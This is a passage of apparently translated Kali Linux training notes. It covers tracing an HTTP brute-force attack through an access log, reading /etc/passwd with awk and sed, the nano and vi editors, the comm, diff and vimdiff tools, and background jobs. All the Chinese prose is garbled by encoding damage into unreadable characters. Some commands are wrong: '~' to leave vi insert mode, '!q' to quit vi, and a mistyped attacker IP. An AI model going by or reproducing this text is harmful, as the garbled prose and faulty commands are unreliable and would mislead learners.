ä¸Šå‡ºç°çš„æ¬¡æ•°ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat access.log|cut -d \" \" -f 1|sort|uniq -c|sort -urn\n   1038 208.68.234.99\n     59 208.115.113.91\n     22 208.54.80.244\n     21 99.127.177.95\n      8 70.194.129.34\n      1 201.21.152.44\n```\n\næœ‰å‡ ä¸ª IP åœ°å€å¾ˆçªå‡ºï¼Œä½†æˆ‘ä»¬å°†é¦–å…ˆå…³æ³¨è®¿é—®é¢‘ç‡æœ€é«˜çš„åœ°å€ã€‚ä¸ºäº†è¿‡æ»¤æ‰ 208.67.234.99 è¿™ä¸ªåœ°å€ï¼Œå¹¶æ˜¾ç¤ºå’Œè®¡ç®—è¯¥ IP æ‰€è¯·æ±‚çš„èµ„æºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„åºåˆ—ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat access.log|grep '208.68.234.99'|cut -d \"\\\\\"\" -f 2|uniq -c\n   1038 GET //admin HTTP/1.1\n```\n\nä»è¿™ä¸ªè¾“å‡ºç»“æœæ¥çœ‹ï¼Œ208.68.234.99 çš„ IP åœ°å€ä¼¼ä¹åœ¨ä¸“é—¨è®¿é—® /admin ç›®å½•ã€‚è®©æˆ‘ä»¬è¿›ä¸€æ­¥æ£€æŸ¥ä¸€ä¸‹ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat access.log|grep '208.68.234.99'|grep '/admin'|sort -u   \n208.68.234.99 - - [22/Apr/2013:07:51:20 -0500] \"GET //admin HTTP/1.1\" 401 742 \"-\" \"Teh Forest Lobster\"\n208.68.234.99 - admin [22/Apr/2013:07:51:25 -0500] \"GET //admin HTTP/1.1\" 200 575 \"-\" \"Teh Forest Lobster\"\n                                                                                                                                                                                                                    \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat access.log|grep '208.68.234.99'|grep -v '/admin'\n```\n\næ˜¾ç„¶ï¼Œ208.68.234.99 å·²ç»å‚ä¸äº†é’ˆå¯¹è¿™ä¸ªç½‘ç»œæœåŠ¡å™¨çš„ HTTP æš´åŠ›æ”»å‡»å°ã€‚æ­¤å¤–ï¼Œåœ¨å¤§çº¦ 1000 æ¬¡å°è¯•ä¹‹åï¼Œä¼¼ä¹è›®åŠ›å°è¯•æˆåŠŸäº†ï¼Œæ­£å¦‚ â€œHTTP 200â€ ä¿¡æ¯æ‰€æ˜¾ç¤ºçš„é‚£æ ·ã€‚\n\n### ç»ƒä¹ \n\n1. ä½¿ç”¨ /etc/passwdï¼Œæå– kali æœºå™¨ä¸Šæ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·å’Œä¸»ç›®å½•å­—æ®µï¼Œè¿™äº›ç”¨æˆ·çš„ shell è¢«è®¾ç½®ä¸º /bin/falseã€‚ç¡®ä¿ä½ ä½¿ç”¨ Bash å•è¡Œä»£ç æ¥æ‰“å°è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚è¾“å‡ºåº”è¯¥ç±»ä¼¼äºä¸‹é¢çš„æ ·å¼\n\n   ```bash\n   kali@kali:~$ YOUR COMMAND HERE...\n   The user mysql home directory is /nonexistent\n   The user Debian-snmp home directory is /var/lib/snmp\n   The user speech-dispatcher home directory is /var/run/speech-dispatcher\n   The user Debian-gdm home directory is /var/lib/gdm3\n   ```\n\n   ```bash\n   â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\n   â””â”€# awk -F: '$NF == \"/bin/false\" { printf(\"The user %s home directory is %s\\\\n\", $1, $6)}' /etc/passwd\n   The user mysql home directory is /nonexistent\n   The user tss home directory is /var/lib/tpm\n   The user Debian-snmp home directory is /var/lib/snmp\n   The user speech-dispatcher home directory is /run/speech-dispatcher\n   The user lightdm home directory is /var/lib/lightdm\n   ```\n\n2. å°† /etc/passwd æ–‡ä»¶å¤åˆ¶åˆ°ä½ çš„ä¸»ç›®å½•ï¼ˆ/home/kaliï¼‰\n\n   ```bash\n   â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\n   â””â”€# cp /etc/passwd /home/kali                                             \n                                                                                                                                                                                                                       \n   â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\n   â””â”€# ls /home/kali \n   Desktop  Documents  Downloads  Music  passwd  Pictures  Public  Templates  Videos\n   ```\n\n3. åœ¨å•è¡Œç¨‹åºä¸­ä½¿ç”¨ cat æ¥æ‰“å° /kali/passwd çš„è¾“å‡ºï¼Œå¹¶å°† â€œGnome Display Managerâ€ å­—ç¬¦ä¸²çš„æ‰€æœ‰å®ä¾‹æ›¿æ¢ä¸º â€œGDMâ€\n\n   ```bash\n   â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\n   â””â”€# cat /etc/passwd|sed 's/\"Gnome Display Manager\"/GDM/'                                     \n   root:x:0:0:root:/root:/usr/bin/zsh\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n   bin:x:2:2:bin:/bin:/usr/sbin/nologin\n   sys:x:3:3:sys:/dev:/usr/sbin/nologin\n   sync:x:4:65534:sync:/bin:/bin/sync\n   games:x:5:60:games:/usr/games:/usr/sbin/nologin\n   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n   irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n   _apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n   systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n   systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n   systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n   mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false\n   tss:x:105:111:TPM software stack,,,:/var/lib/tpm:/bin/false\n   strongswan:x:106:65534::/var/lib/strongswan:/usr/sbin/nologin\n   ntp:x:107:112::/nonexistent:/usr/sbin/nologin\n   messagebus:x:108:113::/nonexistent:/usr/sbin/nologin\n   redsocks:x:109:114::/var/run/redsocks:/usr/sbin/nologin\n   rwhod:x:110:65534::/var/spool/rwho:/usr/sbin/nologin\n   iodine:x:111:65534::/run/iodine:/usr/sbin/nologin\n   miredo:x:112:65534::/var/run/miredo:/usr/sbin/nologin\n   _rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin\n   usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n   tcpdump:x:115:121::/nonexistent:/usr/sbin/nologin\n   rtkit:x:116:122:RealtimeKit,,,:/proc:/usr/sbin/nologin\n   sshd:x:117:65534::/run/sshd:/usr/sbin/nologin\n   statd:x:118:65534::/var/lib/nfs:/usr/sbin/nologin\n   postgres:x:119:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n   avahi:x:120:126:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin\n   stunnel4:x:121:127::/var/run/stunnel4:/usr/sbin/nologin\n   Debian-snmp:x:122:128::/var/lib/snmp:/bin/false\n   speech-dispatcher:x:123:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false\n   sslh:x:124:129::/nonexistent:/usr/sbin/nologin\n   nm-openvpn:x:125:130:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin\n   nm-openconnect:x:126:131:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin\n   pulse:x:127:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin\n   saned:x:128:135::/var/lib/saned:/usr/sbin/nologin\n   inetsim:x:129:137::/var/lib/inetsim:/usr/sbin/nologin\n   colord:x:130:138:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n   geoclue:x:131:139::/var/lib/geoclue:/usr/sbin/nologin\n   lightdm:x:132:140:Light Display Manager:/var/lib/lightdm:/bin/false\n   king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin\n   kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh\n   systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n   dnsmasq:x:134:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n   uuidd:x:135:145::/run/uuidd:/usr/sbin/nologin\n   redis:x:136:146::/var/lib/redis:/usr/sbin/nologin\n   ```\n\n## ä»å‘½ä»¤è¡Œåˆ°ç¼–è¾‘æ–‡ä»¶\n\næ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹åœ¨å‘½ä»¤ Shell ç¯å¢ƒä¸‹çš„æ–‡ä»¶ç¼–è¾‘ã€‚è¿™æ˜¯ä¸€é¡¹åŠå…¶é‡è¦çš„ Linux æŠ€èƒ½ï¼Œç‰¹åˆ«æ˜¯åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œå¦‚æœä½ ç¢°å·§è¿›å…¥äº†ä¸€ä¸ªç±»ä¼¼ Unix çš„æ“ä½œç³»ç»Ÿã€‚\n\nè™½ç„¶æœ‰ä¸€äº›æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå¦‚ gedit å’Œ leafpadï¼Œç”±äºå…¶å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼Œå¯èƒ½åœ¨è§†è§‰ä¸Šæ›´å¸å¼•äººï¼Œä½†æˆ‘ä»¬å°†ä¸“æ³¨äºæ–‡æœ¬çš„ç»ˆç«¯ç¼–è¾‘å™¨ï¼Œå®ƒæ—¢å¼ºè°ƒé€Ÿåº¦åˆå¼ºè°ƒå¤šåŠŸèƒ½æ€§ã€‚\n\nè¯´åˆ°æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ¯ä¸ªäººä¼¼ä¹éƒ½æœ‰è‡ªå·±çš„åå¥½ï¼Œä½†æˆ‘ä»¬å°†ä»‹ç»ä¸¤ä¸ªæœ€å¸¸è§çš„é€‰é¡¹çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼šnano å’Œ viã€‚\n\n### Nano\n\nnano æ˜¯æœ€ç®€å•æ˜“ç”¨çš„æ–‡æœ¬ç¼–è¾‘å™¨ä¹‹ä¸€ã€‚è¦æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¹¶å¼€å§‹ç¼–è¾‘ï¼Œåªéœ€è¿è¡Œnanoï¼Œå°†æ–‡ä»¶åä½œä¸ºä¸€ä¸ªå¯é€‰å‚æ•°ã€‚\n\n```bash\nkali@kali:~$ nano intro_to_nano.txt\n```\n\nä¸€æ—¦æ–‡ä»¶è¢«æ‰“å¼€ï¼Œæˆ‘ä»¬å¯ä»¥ç«‹å³å¼€å§‹å¯¹æ–‡ä»¶è¿›è¡Œä»»ä½•å¿…è¦çš„ä¿®æ”¹ï¼Œå°±åƒæˆ‘ä»¬åœ¨å›¾å½¢ç¼–è¾‘å™¨ä¸­ä¸€æ ·ã€‚åœ¨ä¸€ä¸ªå›¾å½¢ç¼–è¾‘å™¨ä¸­çš„åšæ³•ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6484aa3a-8ca3-4f81-bc85-fbeabdca3833/Untitled.png)\n\nå‘½ä»¤èœå•ä½äºå±å¹•çš„åº•éƒ¨ï¼Œéœ€è¦è®°ä½çš„ä¸€äº›æœ€å¸¸ç”¨çš„å‘½ä»¤åŒ…æ‹¬ï¼š `Ctrl` `O` å°†ä¿®æ”¹å†…å®¹å†™åˆ°æ–‡ä»¶ï¼Œ `Ctrl` `K` å‰ªåˆ‡é€‰ä¸­å†…å®¹ï¼Œ `Ctrl` `U` ç²˜è´´å‰ªåˆ‡æˆ–å¤åˆ¶çš„å†…å®¹ï¼Œ `Ctrl` `W` æœç´¢ï¼Œ `Ctrl` `X` é€€å‡ºã€‚\n\n### Vi\n\nvi æ˜¯ä¸€ä¸ªåŠå…¶å¼ºå¤§çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œèƒ½å¤Ÿä»¥æå¿«çš„é€Ÿåº¦è¿è¡Œï¼Œç‰¹åˆ«æ˜¯å½“æ¶‰åŠåˆ°è‡ªåŠ¨åŒ–é‡å¤æ€§ä»»åŠ¡æ—¶ã€‚ç„¶è€Œï¼Œå®ƒçš„å­¦ä¹ æ›²çº¿æ¯”è¾ƒé™¡å³­ï¼Œä½¿ç”¨èµ·æ¥è¿œä¸å¦‚ Nano ç®€å•ã€‚ç”±äºå®ƒçš„å¤æ‚æ€§ï¼Œæˆ‘ä»¬å°†åªä»‹ç»æœ€åŸºæœ¬çš„å†…å®¹ã€‚ä¸ Nano ä¸€æ ·ï¼Œè¦ç¼–è¾‘ä¸€ä¸ªæ–‡ä»¶ï¼Œåªéœ€å°†å…¶åç§°ä½œä¸ºå‚æ•°ä¼ ç»™ Viã€‚\n\n```bash\nkali@kali:~$ vi intro_to_vi.txt\n```\n\nä¸€æ—¦æ–‡ä»¶è¢«æ‰“å¼€ï¼Œå¯ç”¨æ’å…¥æ–‡æœ¬æ¨¡å¼å¼€å§‹è¾“å…¥ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼ŒæŒ‰ `i` é”®å¹¶å¼€å§‹æ‰“å­—ã€‚\n\nè¦ç¦ç”¨æ’å…¥æ–‡æœ¬æ¨¡å¼å¹¶è¿”å›åˆ°å‘½ä»¤æ¨¡å¼ï¼Œè¯·æŒ‰ `~` é”®ã€‚åœ¨å‘½ä»¤æ¨¡å¼ä¸‹ï¼Œä½¿ç”¨ `dd` åˆ é™¤å½“å‰è¡Œï¼Œ `yy` å¤åˆ¶å½“å‰è¡Œï¼Œ `p` ç²˜è´´å‰ªåˆ‡æ¿å†…å®¹ï¼Œ `x` åˆ é™¤å½“å‰å­—ç¬¦ï¼Œ `:w` å°†å½“å‰æ–‡ä»¶å†™å…¥ç£ç›˜å¹¶åœç•™åœ¨ vi ä¸­ï¼Œ `!q` ä¸å°†æ–‡ä»¶å†™å…¥ç£ç›˜å°±é€€å‡ºï¼Œ `wq` ä¿å­˜å¹¶é€€å‡º\n\nç”±äº vi çœ‹èµ·æ¥å¾ˆç¬¨æ‹™ï¼Œè®¸å¤šç”¨æˆ·é¿å…ä½¿ç”¨å®ƒã€‚ç„¶è€Œï¼Œä»æ¸—é€æµ‹è¯•è€…çš„è§’åº¦æ¥çœ‹ï¼Œ**vi** åœ¨ä¸€ä¸ªæœ‰ç»éªŒçš„ç”¨æˆ·æ‰‹ä¸­å¯ä»¥èŠ‚çœå¤§é‡çš„æ—¶é—´ï¼Œå¹¶ä¸” vi è¢«å®‰è£…åœ¨æ¯ä¸€ä¸ªç¬¦åˆ POSIX æ ‡å‡†çš„ç³»ç»Ÿä¸Šã€‚\n\nè¯·éšæ„è‡ªå·±æ·±å…¥æŒ–æ˜ï¼Œvi çš„åŠŸèƒ½ç›¸å½“å¼ºå¤§ã€‚æ¬²äº†è§£æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒä»¥ä¸‹ç½‘å€ï¼š\n\n> https://en.wikibooks.org/wiki/Learning_the_vi_Editor/vi_Reference\n\n> https://www.debian.org/doc/manuals/debian-tutorial/ch-editor.html\n\n## æ¯”è¾ƒæ–‡ä»¶\n\næ–‡ä»¶æ¯”è¾ƒå¯èƒ½çœ‹èµ·æ¥æ— å…³ç´§è¦ï¼Œä½†ç³»ç»Ÿç®¡ç†å‘˜ã€ç½‘ç»œå·¥ç¨‹å¸ˆã€æ¸—é€æµ‹è¯•äººå‘˜ã€IT æ”¯æŒæŠ€æœ¯äººå‘˜å’Œè®¸å¤šå…¶ä»–ä»¥æŠ€æœ¯ä¸ºå¯¼å‘çš„ä¸“ä¸šäººå‘˜ç»å¸¸ä¾èµ–è¿™ç§æŠ€èƒ½ã€‚\n\n### Comm\n\ncomm å‘½ä»¤å¯¹ä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒï¼Œæ˜¾ç¤ºæ¯ä¸ªæ–‡ä»¶ç‰¹æœ‰çš„è¡Œï¼Œä»¥åŠå®ƒä»¬çš„å…±åŒæ€§è¡Œã€‚å®ƒè¾“å‡ºä¸‰åˆ—ç©ºé—´ä¾¿å®œï¼šç¬¬ä¸€åˆ—åŒ…å«ç¬¬ä¸€ä¸ªæ–‡ä»¶æˆ–å‚æ•°æ‰€ç‰¹æœ‰çš„è¡Œï¼›ç¬¬äºŒåˆ—åŒ…å«ç¬¬äºŒä¸ªæ–‡ä»¶æˆ–å‚æ•°æ‰€ç‰¹æœ‰çš„è¡Œï¼›ç¬¬ä¸‰åˆ—åŒ…å«ä¸¤ä¸ªæ–‡ä»¶å…±æœ‰çš„è¡Œã€‚é€‰é¡¹ `-n` ï¼Œå…¶ä¸­ â€œnâ€ æ˜¯1ã€2 æˆ– 3ï¼Œå¯ä»¥ç”¨æ¥æŠ‘åˆ¶ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—ï¼Œå–å†³äºéœ€è¦ï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ï¼š\n\n```bash\nkali@kali:~$ cat scan-a.txt\n192.168.1.1\n192.168.1.2\n192.168.1.3\n192.168.1.4\n192.168.1.5\n\nkali@kali:~$ cat scan-b.txt\n192.168.1.1\n192.168.1.3\n192.168.1.4\n192.168.1.5\n192.168.1.6\n\nkali@kali:~$ comm scan-a.txt scan-b.txt                \n                192.168.1.1\n192.168.1.2\n                192.168.1.3\n                192.168.1.4\n                192.168.1.5\n        192.168.1.6\n\nkali@kali:~$ comm -12 scan-a.txt scan-b.txt\n192.168.1.1\n192.168.1.3\n192.168.1.4\n192.168.1.5\n```\n\nåœ¨ç¬¬ä¸€ä¸ªä¾‹å­ä¸­ï¼Œcomm åˆ†åˆ«æ˜¾ç¤ºäº† scan-a.txt ä¸­çš„ç¬¬ä¸€è¡Œã€scan-b.txt ä¸­çš„ä¼Ÿä¸€è¡Œä»¥åŠä¸¤ä¸ªæ–‡ä»¶å¤¹ä¸­å‘ç°çš„è¡Œã€‚æ­£åœ¨ç¬¬äºŒä¸ªä¾‹å­ä¸­ï¼Œcomm -12 åªæ˜¾ç¤ºåœ¨ä¸¤ä¸ªæ–‡ä»¶å¤¹ä¸­å‘ç°çš„è¡Œï¼Œå› ä¸ºæˆ‘ä»¬æŠ‘åˆ¶äº†ç¬¬ä¸€å’Œç¬¬äºŒåˆ—ã€‚\n\n### Diff\n\ndiff å‘½ä»¤ç”¨äºæ£€æµ‹æ–‡ä»¶ä¹‹é—´çš„å·®å¼‚ï¼Œç±»ä¼¼äº comm å‘½ä»¤ã€‚ç„¶è€Œï¼Œdiff è¦å¤æ‚å¾—å¤šï¼Œæ”¯æŒè®¸å¤šè¾“å‡ºæ ¼å¼ã€‚ä¸¤ä¸ªæœ€æµè¡Œçš„æ ¼å¼åŒ…æ‹¬ä¸Šä¸‹æ–‡æ ¼å¼ï¼ˆ-cï¼‰å’Œç»Ÿä¸€æ ¼å¼ï¼ˆ-uï¼‰ã€‚\n\n```bash\nkali@kali:~$ diff -c scan-a.txt scan-b.txt\n*** scan-a.txt  2022-03-16 21:27:48.331470356 -0400\n--- scan-b.txt  2022-03-16 21:27:57.663470846 -0400\n***************\n*** 1,5 ****\n  192.168.1.1\n- 192.168.1.2\n  192.168.1.3\n  192.168.1.4\n  192.168.1.5\n--- 1,5 ----\n  192.168.1.1\n  192.168.1.3\n  192.168.1.4\n  192.168.1.5\n+ 192.168.1.6\nkali@kali:~$ diff -u scan-a.txt scan-b.txt\n--- scan-a.txt  2022-03-16 21:27:48.331470356 -0400\n+++ scan-b.txt  2022-03-16 21:27:57.663470846 -0400\n@@ -1,5 +1,5 @@\n 192.168.1.1\n-192.168.1.2\n 192.168.1.3\n 192.168.1.4\n 192.168.1.5\n+192.168.1.6\n```\n\nè¾“å‡ºä¸­ä½¿ç”¨ â€œ-â€ æŒ‡ç¤ºå™¨æ˜¾ç¤ºè¯¥è¡Œå‡ºç°åœ¨ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œä½†æ²¡æœ‰å‡ºç°åœ¨ç¬¬äºŒä¸ªæ–‡ä»¶ä¸­ã€‚åä¹‹ï¼Œâ€œ+â€ æŒ‡ç¤ºå™¨æ˜¾ç¤ºè¯¥è¡Œå‡ºç°åœ¨ç¬¬äºŒä¸ªæ–‡ä»¶ä¸­ï¼Œä½†æ²¡æœ‰å‡ºç°åœ¨ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚\n\nè¿™äº›æ ¼å¼ä¹‹é—´æœ€æ˜æ˜¾çš„åŒºåˆ«æ˜¯ï¼Œç»Ÿä¸€æ ¼å¼ä¸æ˜¾ç¤ºæ–‡ä»¶ä¹‹é—´åŒ¹é…çš„è¡Œï¼Œä½¿ç»“æœæ›´çŸ­ã€‚åœ¨è¿™ä¸¤ç§æ ¼å¼ä¸­ï¼ŒæŒ‡æ ‡çš„å«ä¹‰æ˜¯ç›¸åŒçš„ã€‚\n\n### Vimdiff\n\nvimdiff ç”¨å¤šä¸ªæ–‡ä»¶æ‰“å¼€ vimï¼Œæ¯ä¸ªçª—å£éƒ½æœ‰ä¸€ä¸ªã€‚æ–‡ä»¶ä¹‹é—´çš„å·®å¼‚è¢«é«˜äº®æ˜¾ç¤ºï¼Œè¿™ä½¿å¾—è§†è§‰ä¸Šçš„æ£€æŸ¥æ›´åŠ å®¹æ˜“ã€‚æœ‰å‡ ä¸ªå¿«æ·é”®å¯èƒ½æ˜¯æœ‰ç”¨çš„ï¼Œæ¯”å¦‚è¯´ï¼š\n\n- doï¼šæŠŠå¦ä¸€ä¸ªçª—å£ä¸­çš„æ”¹åŠ¨æ”¾åˆ°å½“å‰çª—å£ä¸­ã€‚\n- dpï¼šæŠŠå½“å‰çª—å£ä¸­çš„å˜åŒ–æ”¾åˆ°å¦ä¸€ä¸ªçª—å£ä¸­ã€‚\n- ]cï¼šè·³è½¬åˆ°ä¸‹ä¸€ä¸ªå˜åŒ–ã€‚\n- [cï¼šè·³è½¬åˆ°ä¸Šä¸€ä¸ªå˜åŒ–ã€‚\n- `Ctrl` `W` ï¼šåˆ‡æ¢åˆ°å¦ä¸€ä¸ªåˆ†å‰²çª—å£ã€‚\n\næˆ‘ä»¬æ¥çœ‹çœ‹ä¸€ä¸ªä¾‹å­ï¼š\n\n```bash\nkali@kali:~$ vimdiff scan-a.txt scan-b.txt\n```\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/edea1d22-8812-4aac-bcd1-94721633a2f2/Untitled.png)\n\n## ç®¡ç†è¿›ç¨‹\n\nLinux å†…æ ¸é€šè¿‡ä½¿ç”¨è¿›ç¨‹æ¥ç®¡ç†å¤šä»»åŠ¡ã€‚å†…æ ¸ç»´æŠ¤æ¯ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ä»¥å¸®åŠ©ä¿æŒäº‹æƒ…çš„æ¡ç†æ€§ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½è¢«åˆ†é…äº†ä¸€ä¸ªç¼–å·ï¼Œç§°ä¸ºè¿›ç¨‹ IDï¼ˆPIDï¼‰ã€‚\n\nLinux Shell è¿˜å¼•å…¥äº†ä½œä¸šçš„æ¦‚å¿µï¼Œä»¥ç®€åŒ–ç”¨æˆ·åœ¨ç»ˆç«¯ä¼šè¯ä¸­çš„å·¥ä½œæµç¨‹ã€‚ä¾‹å¦‚ cat error|wc -m æ˜¯ä¸¤ä¸ªè¿›ç¨‹çš„æµæ°´çº¿ï¼ŒShell å°†å…¶è§†ä¸ºä¸€ä¸ªä½œä¸šã€‚ä½œä¸šæ§åˆ¶æ˜¯æŒ‡æœ‰é€‰æ‹©åœ°æš‚åœä½œä¸šçš„æ‰§è¡Œï¼Œå¹¶åœ¨ä»¥åçš„æ—¶é—´æ¢å¤å…¶æ‰§è¡Œçš„èƒ½åŠ›ã€‚è¿™å¯ä»¥é€šè¿‡ç‰¹å®šçš„å‘½ä»¤æ¥å®ç°ï¼Œæˆ‘ä»¬å¾ˆå¿«å°±ä¼šæ¢è®¨è¿™ä¸ªé—®é¢˜ã€‚\n\n### èƒŒæ™¯è¿›ç¨‹ï¼ˆbgï¼‰\n\næœ¬æ¨¡å—ä¸­ä»¥å‰çš„å·¥ä½œéƒ½æ˜¯åœ¨å‰å°è¿è¡Œçš„ï¼Œè¿™æ„å‘³ç€ç»ˆç«¯è¢«å ç”¨ï¼Œåœ¨å½“å‰å·¥ä½œå®Œæˆä¹‹å‰ä¸èƒ½æ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚ç”±äºæˆ‘ä»¬çš„å¤§å¤šæ•°ä¾‹å­éƒ½æ˜¯çŸ­å°ç²¾æ‚çš„ï¼Œæ‰€ä»¥è¿™å¹¶æ²¡æœ‰é€ æˆä»€ä¹ˆé—®é¢˜ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬å°†åœ¨åé¢çš„æ¨¡å—ä¸­è¿è¡Œæ›´é•¿ã€æ›´å¤æ‚çš„å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™äº›å‘½ä»¤å‘é€åˆ°åå°ï¼Œä»¥ä¾¿é‡æ–°è·å¾—å¯¹ç»ˆç«¯çš„æ§åˆ¶æƒå¹¶æ‰§è¡Œæ›´å¤šçš„å‘½ä»¤ã€‚å°†ä¸€ä¸ªè¿›ç¨‹è½¬å…¥åå°çš„æœ€å¿«æ–¹æ³•æ˜¯åœ¨å‘½ä»¤çš„æœ«å°¾åŠ ä¸Šä¸€ä¸ªå®‰å€å·ï¼ˆ&ï¼‰ï¼Œåœ¨å®ƒå¯åŠ¨åç«‹å³å°†å…¶å‘é€åˆ°åå°ã€‚è®©æˆ‘ä»¬è¯•è¯•ä¸€ä¸ªç®€å•çš„ä¾‹å­ã€‚\n\n```bash\nkali@kali:~$ ping -c 400 localhost > ping_results.txt &\n```\n\næˆ‘ä»¬ç”¨ ping å‘½ä»¤å‘æœ¬åœ°æ¥å£å‘é€äº† 400 ä¸ª ICMP å›æ³¢è¯·æ±‚ï¼Œå¹¶å°†ç»“æœå†™å…¥ä¸€ä¸ªåä¸º ping_results.txt çš„æ–‡ä»¶ã€‚æ‰§è¡Œè¿‡ç¨‹è‡ªåŠ¨åœ¨åå°è¿è¡Œï¼Œä½¿ shell å¯ä»¥è‡ªç”±åœ°è¿›è¡Œå…¶ä»–æ“ä½œã€‚\n\nä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å¿˜äº†åœ¨å‘½ä»¤çš„æœ«å°¾åŠ ä¸Šå®‰å€å·ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿè¯¥å‘½ä»¤å°†åœ¨å‰å°è¿è¡Œï¼Œæˆ‘ä»¬å°†è¢«è¿«ç”¨ `Ctrl` `C` å–æ¶ˆè¯¥å‘½ä»¤ï¼Œæˆ–è€…ç­‰åˆ°è¯¥å‘½ä»¤ç»“æŸåé‡æ–°è·å¾—å¯¹ç»ˆç«¯çš„æ§åˆ¶ã€‚å¦ä¸€ä¸ªé€‰æ‹©æ˜¯åœ¨ä½œä¸šå·²ç»å¼€å§‹åç”¨ `Ctrl` `Z` æš‚åœä½œä¸šã€‚ä¸€æ—¦ä½œä¸šè¢«æš‚åœï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ bg å‘½ä»¤åœ¨åå°æ¢å¤å®ƒã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ping -c 400 localhost > ping_results.txt\n^Z\nzsh: suspended  ping -c 400 localhost > ping_results.txt\n                                                                                           \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# bg                                                                           148 â¨¯ 1 âš™\n[1]  + continued  ping -c 400 localhost > ping_results.txt\n                                                                                           \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€#\n```\n\nå·¥å…·ç°åœ¨åœ¨åå°è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­æŒ‰ç…§æˆ‘ä»¬æ„æ„¿ä½¿ç”¨ç»ˆç«¯ã€‚åœ¨è¿™æ ·åšçš„æ—¶å€™ï¼Œè¯·è®°ä½ï¼Œæœ‰äº›è¿›ç¨‹æ˜¯å¯¹æ—¶é—´æ•æ„Ÿçš„ï¼Œå¦‚æœæš‚åœæ—¶é—´è¿‡é•¿ï¼Œå¯èƒ½ä¼šç»™å‡ºä¸æ­£ç¡®çš„ç»“æœã€‚ä¾‹å¦‚ï¼Œåœ¨ ping çš„ä¾‹å­ä¸­ï¼Œecho 